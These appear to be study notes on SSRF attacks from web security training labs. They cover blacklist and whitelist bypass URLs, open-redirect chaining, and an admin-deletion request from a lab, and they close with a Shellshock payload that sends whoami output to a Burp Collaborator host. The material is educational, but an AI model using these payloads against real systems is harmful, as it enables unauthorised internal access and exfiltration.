## Basic SSRF against the local server
- If the request is accessing an endpoint through http request, modify that and try to fetch something through http://localhost

## Basic SSRF against another back-end system
- If the request is accessing an endpoint through http request, modify it and try to fetch an internal system http://192.168.x.x:8080/admin

## Blacklist (Most of the times http://localhost & http://127.0.0.1 is banned from being accessed)
- http://127.1
- http://2130706433
- http://017700000001
- register your own domain name that resolves to 127.0.0.1
### Obfuscating blocked strings using URL encoding or case variation.- Always try these step by step
- First try: http://localhost/ then http://127.0.0.1/ then http://127.1/ then http://2130706433 then http://017700000001
- If any of them works, then try to query out some internal resource like http://127.1/admin
- If that gets blocked try to url encode some characters in admin and so on...
- Keep bypassing

## Whitelist
- You can embed credentials in a URL before the hostname, using the @ character. For example: https://expected-host@evil-host.
- You can use the # character to indicate a URL fragment. For example: https://evil-host#expected-host.
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: https://expected-host.evil-host.
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
### - You can use combinations of these techniques together. 
### This worked in lab:
- Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
- Append a # to the username and observe that the URL is now rejected.
- Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
- Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos to access the admin interface and delete the target user.

## Bypassing SSRF filters via open redirection
- For example, suppose the application contains an open redirection vulnerability in which the following URL: /product/nextProduct?currentProductId=6&path=http://evil-user.net 
- You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows: http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin

## Blind SSRF with out-of-band detection
- Many web analytics softwares actively check for referer header and even make requests to them
- Put burp collaborator url in referer header and check if it makes a request

## Blind SSRF with Shellshock exploitation
- Use Burp Collaborator client to generate a unique Burp Collaborator payload, and place this into the following Shellshock payload: () { :; }; /usr/bin/nslookup $(whoami).YOUR-SUBDOMAIN-HERE.burpcollaborator.net
- change the Referer header to http://internal_ip_to_access_using_ssrf
